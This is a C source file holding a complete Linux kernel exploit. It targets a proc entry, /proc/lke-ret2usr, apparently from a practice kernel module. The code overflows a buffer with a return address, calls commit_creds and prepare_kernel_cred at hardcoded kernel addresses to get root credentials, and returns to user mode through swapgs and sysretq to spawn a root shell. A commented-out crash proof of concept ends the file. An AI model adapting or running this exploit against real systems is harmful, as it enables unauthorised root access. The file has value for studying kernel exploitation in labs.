#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

struct task_struct;
struct cred;

static struct cred *(*prepare_kernel_cred)(struct task_struct *daemon) = (void *)0xffffffff81081716;
static int (*commit_creds)(struct cred *new) = (void *)0xffffffff8108157b;

uint64_t dummy_stack[512] __attribute__((aligned(16)));

void shell(void)
{
    system("/bin/sh");
    _exit(0);
}

void ret2usr(void)
{
    volatile register uint64_t R11 asm("r11"), RCX asm("rcx"), RSP asm("rsp");
    commit_creds(prepare_kernel_cred(0));
    R11 = 0x202; // RFLAGS
    RCX = (uint64_t)shell;
    RSP = (uint64_t)(dummy_stack + 512);

    asm volatile(
        "cli\n\t"
        "swapgs\n\t"
        "sysretq" ::"r"(R11),
        "r"(RCX), "r"(RSP));
}

int main()
{
    int fd;
    char payload[0x118];

    fd = open("/proc/lke-ret2usr", O_WRONLY);
    if (fd < 0)
    {
        perror("open");
        return EXIT_FAILURE;
    }

    memset(payload, 'A', 0x110);

    *(uint64_t *)(payload + 0x110) = (uint64_t)ret2usr;

    write(fd, payload, sizeof(payload));

    abort(); // don't return write
}

/* POC CODE
int main(void)
{
    int fd = open("/proc/lke-ret2usr", O_WRONLY);
    if (fd<0) {
        perror("open");
        return 0;
    }

    char payload[512];
    // PoC
    memset(payload, 'A', sizeof(payload));
    write(fd, payload, sizeof(payload));

    return 0;
}
*/